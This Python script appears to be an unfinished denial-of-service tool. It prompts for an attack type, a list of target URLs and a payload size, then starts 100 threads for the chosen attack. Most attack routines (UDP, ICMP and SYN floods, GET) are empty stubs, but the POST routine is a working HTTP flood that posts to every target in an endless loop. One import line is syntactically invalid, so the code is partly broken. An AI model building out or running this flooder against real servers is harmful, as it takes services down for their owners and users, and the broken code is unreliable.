import requests as res
import threading as th
import time
import sys
import os
import lib/attack_type as ty

choices = [1, 2, 3]
Threads = []


def udp_flooding(i):
    print("first choice")

def ICMP(i):
    pass

def Syn_flood(i):
    pass

def pof(i):
    pass

def Post(i):
    print("using post method to: ", vector)
    print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
    time.sleep(10)
    while True:
        for target in vector:
            response = res.post(target, data=bye, json=None)
            print(response.text)

def Get(i):
    pass

try:
    attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
    vector = input("target(targets):\n").split(" ") #target
    bye = input("number of bytes: \n").encode() #packet size

    if attack_type == choices[0]:
        subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
        if subtype0 == 1:
            for i in range(100):
                t = th.Thread(target=udp_flooding, args=(i,))
                Threads.append(t)
                t.start()
        else:
            for i in range(100):
                t = th.Thread(target=ICMP, args=(i,))
                Threads.append(t)
                t.start()

    elif attack_type == choices[1]:
        subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
        if subtype1 == 1:
            for i in range(100):
                t = th.Thread(target=Syn_flood, args=(i,))
                Threads.append(t)
                t.start()
        else:
            for i in range(100):
                t = th.Thread(target=pof, args=(i,))
                Threads.append(t)
                t.start()

    elif attack_type == choices[2]:
        subtype2 = int(input("Post(1) or Get(2)\n"))
        if subtype2 == 1:
            for i in range(100):
                t = th.Thread(target=Post, args=(i,))
                Threads.append(t)
                t.start()
        else:
            for i in range(100):
                t = th.Thread(target=Get, args=(i,))
                Threads.append(t)
                t.start()

    
    for t in Threads:
        t.join()

except KeyboardInterrupt:
    os.system("cls")
    sys.exit()
